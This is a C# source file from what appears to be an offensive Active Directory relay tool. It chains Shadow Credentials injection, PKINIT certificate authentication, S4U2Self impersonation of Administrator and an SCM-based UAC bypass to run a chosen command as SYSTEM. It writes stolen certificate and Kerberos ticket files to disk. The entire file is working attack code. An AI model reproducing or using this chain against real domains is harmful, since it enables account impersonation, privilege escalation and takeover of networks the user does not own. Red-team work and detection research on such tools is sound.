using HttpLdapRelay.Kerberos;

namespace HttpLdapRelay
{
    /// <summary>
    /// Shadow Credentials attack with PKINIT + S4U2Self + SCMUACBypass
    /// 
    /// Attack flow:
    /// 1. Shadow Credentials injection (done by LdapRelayClient)
    /// 2. PKINIT with generated certificate → TGT for computer account
    /// 3. S4U2Self → Service ticket impersonating Administrator
    /// 4. SCMUACBypass → Create service as SYSTEM using the ticket
    /// </summary>
    public class ShadowCredentialsAttack
    {
        private readonly string _domain;
        private readonly string _dcHost;
        private readonly string _targetSamAccountName;
        private ShadowCredentials.ShadowCredentialResult _shadowCredResult;
        private string _pfxPath;

        // SCMUACBypass configuration
        private bool _useSCMBypass;
        private string _command;

        public ShadowCredentialsAttack(string domain, string dcHost, string targetSamAccountName, string command)
        {
            _domain = domain;
            _dcHost = dcHost;
            _targetSamAccountName = targetSamAccountName;
            _useSCMBypass = true;
            _command = command;
        }


        /// <summary>
        /// Execute full attack: PKINIT → TGT → S4U2Self → Admin ticket → SCMUACBypass
        /// </summary>
        public void ExecuteFullAttack(ShadowCredentials.ShadowCredentialResult shadowCredResult, string impersonateUser = "Administrator")
        {
            _shadowCredResult = shadowCredResult;

            string hostname = GetHostnameFromSamAccountName();
            _pfxPath = Path.Combine(Environment.CurrentDirectory, $"{hostname}_shadow.pfx");
            File.WriteAllBytes(_pfxPath, shadowCredResult.PfxBytes);

            TryPkinitClient(impersonateUser);

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[*] Program completed.");
            Console.ResetColor();
        }

        private bool TryPkinitClient(string impersonateUser)
        {
            try
            {
                using var pkinitClient = new PKINITClient(_dcHost);

                // Step 1: Get TGT with PKINIT
                bool tgtOk = pkinitClient.GetTGT(
                    _domain,
                    _targetSamAccountName,
                    _shadowCredResult.PfxBytes,
                    _shadowCredResult.PfxPassword
                );

                if (!tgtOk)
                {
                    Console.WriteLine("[!] PKINIT failed to obtain TGT");
                    return false;
                }

                // Step 2: S4U2Self to impersonate Administrator
                // IMPORTANT: For SCM access, SPN must be HOST/COMPUTERNAME (not FQDN!)
                string hostname = GetHostnameFromSamAccountName();
                string targetFQDN = $"{hostname}.{_domain.ToLower()}";

                // Determine which SPN to request based on whether SCM bypass is enabled
                string targetSPN;
                if (_useSCMBypass)
                {
                    // For SCM, use HOST/hostname (short name, not FQDN)
                    targetSPN = $"HOST/{hostname}";
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine($"[*] SCM UAC Bypass mode: requesting HOST SPN");
                    Console.ResetColor();
                }
                else
                {
                    // For remote access via psexec/smbexec, use cifs/fqdn
                    targetSPN = $"cifs/{targetFQDN}";
                }

                Console.WriteLine($"[*] Requesting service ticket for: {targetSPN}");

                byte[] kirbi = pkinitClient.S4U2Self(impersonateUser, targetSPN);

                if (kirbi == null)
                {
                    Console.WriteLine("[!] S4U2Self failed to obtain service ticket");
                    return false;
                }

                // Save the kirbi file
                string safeSPN = targetSPN.Replace("/", "_").Replace(".", "-");
                string kirbiPath = Path.Combine(Environment.CurrentDirectory, $"{impersonateUser.ToLower()}_{safeSPN}.kirbi");
                File.WriteAllBytes(kirbiPath, kirbi);

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Service ticket saved to: {kirbiPath}");
                Console.ResetColor();

                // Step 3: SCM UAC Bypass if enabled
                if (_useSCMBypass)
                {
                    Console.WriteLine();
                    Console.WriteLine("[*] Executing SCM UAC Bypass...");

                    bool scmSuccess = SCMUACBypass.Execute(kirbi, hostname, _command);

                    if (scmSuccess)
                    {
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("╔═══════════════════════════════════════════════════════════════╗");
                        Console.WriteLine("║              SCM UAC Bypass SUCCESSFUL!                       ║");
                        Console.WriteLine("╚═══════════════════════════════════════════════════════════════╝");
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[!] SCM UAC Bypass failed. Showing manual instructions...");
                        Console.ResetColor();
                    }
                }
                return true;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[!] PKINIT client error: {ex.Message}");
                Console.ResetColor();
                return false;
            }
        }

        private string GetHostnameFromSamAccountName() => _targetSamAccountName.TrimEnd('$');
    }

    /// <summary>
    /// Extension methods for LdapRelayClient
    /// </summary>
    public static class LdapRelayClientAttackExtensions
    {
        public static bool ExecuteShadowCredentialsAttack(
            this LdapRelayClient ldapClient,
            string samAccountName,
            string domain,
            string dcHost,
            string impersonateUser,
            string command,
            bool forceOverwrite)
        {
            try
            {
                var shadowResult = ldapClient.AddShadowCredentialsAuto(samAccountName, domain, null, forceOverwrite);
                var attack = new ShadowCredentialsAttack(domain, dcHost, samAccountName, command);
                attack.ExecuteFullAttack(shadowResult, impersonateUser);
                return true;
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Attack failed: {ex.Message}");
                Console.ResetColor();
                return false;
            }
        }
    }
}